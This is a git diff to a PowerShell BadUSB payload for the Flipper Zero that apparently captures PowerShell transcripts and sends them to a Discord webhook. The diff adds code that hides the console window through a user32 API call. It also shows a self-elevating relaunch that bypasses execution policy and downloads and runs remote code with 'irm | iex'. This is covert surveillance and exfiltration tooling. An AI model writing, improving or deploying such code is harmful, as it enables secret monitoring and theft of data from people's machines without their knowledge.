@@ -3,6 +3,8 @@ if ($dc.Length -eq 0){
 write-host "No webhook supplied"
 }
 
+$hideWindow = 1 # 1 = Hidden
+
 [Console]::BackgroundColor = "Black"
 [Console]::SetWindowSize(60, 20)
 Clear-Host
@@ -24,10 +26,10 @@ function CreateRegKeys {
 
 Function RestartScript{
     if($PSCommandPath.Length -gt 0){
-        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W H -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
+        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
     }
     else{
-        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Global-PS-Trascription-to-Discord/main.ps1 | iex") -Verb RunAs
+        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Global-PS-Trascription-to-Discord/main.ps1 | iex") -Verb RunAs
     }
     exit
 }
@@ -152,6 +154,21 @@ $onChangeAction = {
 }
 
 Register-ObjectEvent -InputObject $watcher -EventName "Changed" -Action $onChangeAction
+
+If ($HideWindow -gt 0){
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+    if($hwnd -ne [System.IntPtr]::Zero){
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+    else{
+        $Host.UI.RawUI.WindowTitle = 'hideme'
+        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+        $hwnd = $Proc.MainWindowHandle
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+}
 
 while ($true) {
 
